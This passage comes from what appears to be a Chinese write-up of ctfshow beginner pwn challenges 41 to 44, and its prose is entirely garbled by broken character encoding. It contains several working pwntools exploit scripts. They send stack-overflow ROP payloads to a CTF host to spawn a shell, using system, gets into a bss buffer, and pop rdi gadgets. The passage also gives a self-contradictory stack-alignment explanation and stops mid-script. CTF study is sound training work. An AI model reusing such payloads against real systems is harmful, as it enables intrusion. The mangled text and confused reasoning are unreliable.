<p>å‘ç°è¿™æœ‰ç°æˆçš„systemå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥è°ƒç”¨shå»è¿›è¡Œææƒã€‚</p>
<p>çŸ¥é“äº†shåœ°å€æ˜¯0x80487BAï¼Œå°±å¯ä»¥å†™expäº†ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28261</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="mh">0x80487BA</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x12</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_042">PWN_042
</h3><p>é¢˜ç›®ï¼š64ä½çš„ system(); ä½†æ˜¯æ²¡&quot;/bin/sh&quot; ï¼Œå¥½åƒæœ‰å…¶ä»–çš„å¯ä»¥æ›¿ä»£ã€‚</p>
<p>æ¥çœ‹IDA64ä½åˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/128.png"
	width="670"
	height="180"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/128_hu_773d0a462a9bb4a6.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/128_hu_8acb802bbfbe83f2.png 1024w"
	loading="lazy"
	
		alt="å­˜åœ¨æ ˆæº¢å‡º"
	
	
		class="gallery-image" 
		data-flex-grow="372"
		data-flex-basis="893px"
	
></p>
<p>checksecï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/129.png"
	width="946"
	height="234"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/129_hu_720d126d72ab49b9.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/129_hu_e7d4450d3040833.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="404"
		data-flex-basis="970px"
	
></p>
<p>åœ¨è·Ÿè¿›hintå‡½æ•°ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œå’ŒPWN_041ä¸€æ ·çš„ï¼Œè¿™æ¬¡ç¨‹åºæ˜¯64ä½ï¼Œ<a class="link" href="https://expl0rer.top/p/ctfshow-pwn-writeup/#32%e4%bd%8d%e5%92%8c64%e4%bd%8d%e5%8f%af%e6%89%a7%e8%a1%8c%e7%a8%8b%e5%ba%8f%e7%9a%84%e5%8f%82%e6%95%b0%e4%bc%a0%e9%80%92%e9%a1%ba%e5%ba%8f"  target="_blank" rel="noopener"
    >åœ¨expç¼–å†™ä¸Šæœ‰æ‰€ä¸åŒ</a>ï¼Œéœ€è¦pop_rdiï¼šretã€retçš„åœ°å€ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/130.png"
	width="1265"
	height="375"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/130_hu_5a7538fd605e720d.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/130_hu_a866cc865737ff56.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="337"
		data-flex-basis="809px"
	
></p>
<p>retï¼š0x40053e</p>
<p>pop_rdiï¼š0x400843</p>
<p>å†æ‰¾shçš„åœ°å€å§ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/131.png"
	width="1096"
	height="204"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/131_hu_6a6662067bbd0f05.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/131_hu_9a6c214336b69472.png 1024w"
	loading="lazy"
	
		alt="shçš„åœ°å€æ˜¯0x400872"
	
	
		class="gallery-image" 
		data-flex-grow="537"
		data-flex-basis="1289px"
	
></p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28281</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sh</span> <span class="o">=</span> <span class="mh">0x400872</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x40053e</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x400843</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>flagå°±ä¸ç»™äº†ï¼Œå› ä¸ºé¶æœºç»™çš„flagæ˜¯åŠ¨æ€çš„ã€‚</p>
<h3 id="pwn_043">PWN_043
</h3><p>é¢˜ç›®ï¼š32ä½çš„ system(); ä½†æ˜¯å¥½åƒæ²¡&quot;/bin/sh&quot; ä¸Šé¢çš„åŠæ³•ä¸è¡Œäº†ï¼Œæƒ³æƒ³åŠæ³•ã€‚</p>
<p>IDA32ä½è·Ÿè¿›ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/132.png"
	width="875"
	height="151"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/132_hu_c59120af2cb1695a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/132_hu_cb4a8ac9d3d15d72.png 1024w"
	loading="lazy"
	
		alt="getsæ ˆæº¢å‡º"
	
	
		class="gallery-image" 
		data-flex-grow="579"
		data-flex-basis="1390px"
	
></p>
<p>getså‡½æ•°å¾ˆå±é™©çš„ï¼Œä¸€èˆ¬éƒ½ç”¨fgetsï¼Œç”¨è¿™ä¸ªå¿…æº¢å‡ºçš„å¥½å§&hellip;&hellip;</p>
<p>è·Ÿè¿›hintå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/133.png"
	width="896"
	height="339"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/133_hu_6591d04ae9fff383.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/133_hu_7fceb86594aae882.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="264"
		data-flex-basis="634px"
	
></p>
<p>æˆ‘ä»¬å‘ç°äº†systemå‡½æ•°ï¼Œä½†å´ä¸æä¾›shã€/bin/shç»™æˆ‘ä»¬ï¼Œåªèƒ½åˆ©ç”¨getså‡½æ•°ã€‚ï¼ˆgetså‡½æ•°è¿›è¡Œè¯»å…¥æ•°æ®ï¼Œå®ƒå¯ä»¥æ— é™è¯»å–åˆ°<strong>å†…å­˜</strong>ï¼Œä¸ä¼šåˆ¤æ–­ä¸Šé™ï¼Œå¯ä»¥åŒ…å«ç©ºæ ¼ï¼Œä»¥å›è½¦ç»“æŸè¯»å–ã€‚æ‰€ä»¥è¿™é‡Œå°±å­˜åœ¨äº†æ˜æ˜¾çš„æº¢å‡ºï¼‰</p>
<p>é‚£å¤§è‡´çš„expæ€è·¯æ¥äº†ï¼›å…ˆç”¨cyclicäº§ç”Ÿåƒåœ¾å€¼å¡«å……ç¼“å†²åŒºå’Œebpæœ¬èº«ï¼Œå‡ºç°æ ˆæº¢å‡ºåï¼Œå°†è¿”å›å€¼è¦†ç›–ä¸ºgetså‡½æ•°åœ°å€ï¼ŒåŠ ä¸Šebxå¯„å­˜å™¨å¼¹æ ˆï¼Œgetså‡½æ•°è¯»å–æ•°æ®ï¼ŒæŠŠæˆ‘ä»¬æ‰€ç»™çš„/bin/shå­—ç¬¦ä¸²å†™å…¥è¿™ä¸ªå†…å­˜é‡Œé¢ï¼Œå†æ¬¡åˆ©ç”¨æ ˆæº¢å‡ºï¼Œå°†è¿”å›åœ°å€è¦†ç›–ä¸º system å‡½æ•°çš„åœ°å€ï¼Œä½¿å¾— gets æ‰§è¡Œå®Œåï¼Œç¨‹åºè‡ªåŠ¨è·³è½¬åˆ° system æ‰§è¡Œï¼Œæ‰§è¡Œ <code>system(&quot;/bin/sh&quot;)</code> è·å– shellã€‚</p>
<p>è¿™ä¸ªå†…å­˜å»å“ªæ‰¾ï¼Ÿ</p>
<p>åœ¨bsså­—æ®µï¼ˆæœªåˆå§‹åŒ–å­—æ®µï¼‰æ‰¾åˆ°äº†buf2å˜é‡ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/134.png"
	width="929"
	height="215"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/134_hu_e07f711cd6a6e5ef.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/134_hu_4dc65a9b43ad1b81.png 1024w"
	loading="lazy"
	
		alt="buf2ï¼šæœªå®šä¹‰çš„å†…å­˜å˜é‡"
	
	
		class="gallery-image" 
		data-flex-grow="432"
		data-flex-basis="1037px"
	
></p>
<p>æŸ¥è¯¢pop_ebxçš„åœ°å€</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/135.png"
	width="1245"
	height="505"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/135_hu_d45e675ff438bc16.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/135_hu_c1d3ce761cd87966.png 1024w"
	loading="lazy"
	
		alt="pop_ebxçš„åœ°å€æ˜¯0x8048409"
	
	
		class="gallery-image" 
		data-flex-grow="246"
		data-flex-basis="591px"
	
></p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28152</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">gets</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;gets&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_ebx</span> <span class="o">=</span> <span class="mh">0x8048409</span>
</span></span><span class="line"><span class="cl"><span class="n">buf2</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;buf2&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6C</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">gets</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œæœ‰ä¸ªç–‘é—®ç‚¹å°±æ˜¯ä¸ºä»€ä¹ˆè¦ç”¨buf2å†…å­˜å˜é‡å‘¢ï¼Ÿæˆ‘ç›´æ¥è°ƒç”¨systemå‡½æ•°åå†æ³¨å…¥/bin/shä¸å°±å¥½äº†å—ï¼Ÿè¿™æ˜¾ç„¶ä¸è¡Œï¼Œå› ä¸ºæ­¤æ—¶çš„/bin/shæ˜¯ä¸€ä¸ªæ™®é€šçš„å­—ç¬¦ä¸²ï¼Œå¹¶æ²¡æœ‰åˆ†é…åœ°å€ï¼Œå¯æ‰§è¡Œç¨‹åºçš„PIEå’ŒASLRä¿æŠ¤æœºåˆ¶ä¼šè®©å¸ƒå±€å‘ç”ŸéšæœºåŒ–æ”¹å˜ï¼Œä½ ç»™çš„å­—ç¬¦ä¸²æ²¡åœ°å€ï¼Œè€Œsystemå‡½æ•°éœ€è¦æ¥å—åœ°å€æ‰èƒ½æ‰§è¡Œï¼Œè€Œéç›´æ¥æ³¨å…¥æ— åœ°å€çš„çº¯å­—ç¬¦ä¸²ï¼Œbuf2æ˜¯bsså­—æ®µçš„å…¨å±€å˜é‡ï¼Œåœ°å€å›ºå®šï¼Œèƒ½ç»™/bin/shä¸€ä¸ªå›ºå®šåœ°å€ï¼Œè®©systemç²¾å‡†æ‰¾åˆ°å®ƒå¹¶æ‰§è¡Œã€‚</p>
<h3 id="pwn_044">PWN_044
</h3><p>é¢˜ç›®ï¼š64ä½çš„ system(); ä½†æ˜¯å¥½åƒæ²¡&quot;/bin/sh&quot; ä¸Šé¢çš„åŠæ³•ä¸è¡Œäº†ï¼Œæƒ³æƒ³åŠæ³•ã€‚</p>
<p>IDAåˆ†æï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/136.png"
	width="855"
	height="194"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/136_hu_ad575c4dd168699f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/136_hu_f6ed3a0acf42320a.png 1024w"
	loading="lazy"
	
		alt="mainå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="440"
		data-flex-basis="1057px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/137.png"
	width="671"
	height="175"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/137_hu_deb54602fe7918b8.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/137_hu_19200459f04ccefb.png 1024w"
	loading="lazy"
	
		alt="getså‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="383"
		data-flex-basis="920px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/138.png"
	width="869"
	height="140"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/138_hu_176d74d6a11854a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/138_hu_3cd2788b29cb94c5.png 1024w"
	loading="lazy"
	
		alt="bsså­—æ®µä¸Šçš„buf2å˜é‡"
	
	
		class="gallery-image" 
		data-flex-grow="620"
		data-flex-basis="1489px"
	
></p>
<p>å’Œä¸Šä¸€é¢˜åŒºåˆ«æ˜¯å‚æ•°ä¼ é€’ï¼Œ64ä½çš„å‰6å‚æ•°æ˜¯é å¯„å­˜å™¨rdiä¼ é€’çš„ã€‚æŸ¥è¯¢<code>pop rdiï¼›ret</code>æ±‡ç¼–å‘½ä»¤çš„åœ°å€ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/139.png"
	width="1478"
	height="361"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/139_hu_1875753dd456a7b6.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/139_hu_56ce53ca262cfd73.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="409"
		data-flex-basis="982px"
	
></p>
<p>pop rdi ; retï¼š0x4007f3</p>
<p>retï¼š0x4004fe</p>
<p>é‚£expå¤§è‡´ä¸å˜ï¼Œä¸»è¦æ˜¯payloadå§ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">gets</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥å‘ç°è¿™æ˜¯é”™è¯¯çš„ï¼Œè¿›å…¥ä¸äº†äº¤äº’ï¼Œé”™å°±é”™åœ¨retï¼Œè¿™é‡Œä¸éœ€è¦è¿›è¡Œæ‰‹åŠ¨è°ƒæ ˆå †å¹³è¡¡ï¼š</p>
<blockquote>
<p><code>gets</code> æ‰§è¡Œå®Œåçš„æ€»åç§»æ˜¯ 44 å­—èŠ‚ï¼ˆ36+8ï¼‰ã€‚</p>
<p>åç»­æ‰§è¡Œ <code>pop_rdi</code>ï¼ˆ8 å­—èŠ‚ï¼‰+ <code>buf2</code> åœ°å€ï¼ˆ8 å­—èŠ‚ï¼‰åï¼Œæ€»åç§»å˜ä¸º 44+8+8=60 å­—èŠ‚ã€‚</p>
<p>60 å­—èŠ‚ Ã· 16 å­—èŠ‚ = 3 ä½™ 12ï¼Ÿä¸å¯¹ â€”â€” æ­¤æ—¶è°ƒç”¨ <code>system</code> å‰ï¼Œ<code>rsp</code> æŒ‡å‘ <code>system</code> å‡½æ•°çš„åœ°å€ï¼Œè€Œ <code>60 + 8</code>ï¼ˆ<code>system</code> åœ°å€æœ¬èº«ï¼‰= 68 å­—èŠ‚ï¼Œ68 Ã· 16 = 4 ä½™ 4ï¼Ÿè¿™æ˜¾ç„¶ä¸å¯¹ã€‚</p>
<p><strong>æ­£ç¡®ç†è§£</strong>ï¼šä¸ç”¨çº ç»“é™æ€æ•°å­—ï¼Œè€Œæ˜¯è¦çœ‹åˆ° <code>gets</code> çš„æ‰§è¡Œå¼•å…¥äº†ä¸€æ¬¡ â€œé¢å¤–çš„æ ˆå¼¹å‡ºâ€ï¼ˆ8 å­—èŠ‚ï¼‰ï¼Œæ°å¥½æŠµæ¶ˆäº†éƒ¨åˆ†åç§»çš„ â€œéå¯¹é½é‡â€ï¼Œä½¿å¾—æœ€ç»ˆè°ƒç”¨ <code>system</code> æ—¶ï¼Œ<code>rsp</code> åˆšå¥½è½åœ¨ 16 å­—èŠ‚å¯¹é½çš„åœ°å€ä¸Š â€”â€” è¿™æ˜¯<em>åŠ¨æ€æ‰§è¡Œ</em>ä¸­æ ˆè‡ªç„¶è°ƒæ•´çš„ç»“æœï¼Œè€Œéé™æ€è®¡ç®—çš„æ€»å’Œã€‚</p>
</blockquote>
<blockquote class="alert alert-note">
    <blockquote>
<p>åœ¨ 64 ä½ PWN é¢˜ä¸­ï¼Œâ€œåŠ¨æ€å¯¹é½â€ æ˜¯å¦éœ€è¦åŠ  <code>ret</code>ï¼Œæ ¸å¿ƒçœ‹ <strong>â€œä¸­é—´æ˜¯å¦æœ‰å‡½æ•°æ‰§è¡Œå¹¶è‡ªåŠ¨è°ƒæ•´æ ˆæŒ‡é’ˆâ€</strong>ã€‚</p>
</blockquote></blockquote>
<p>æ­£ç¡®çš„expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28244</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">gets</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;gets&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x4007f3</span>
</span></span><span class="line"><span class="cl"><span class="n">buf2</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;buf2&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">gets</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf2</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;/bin/sh&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
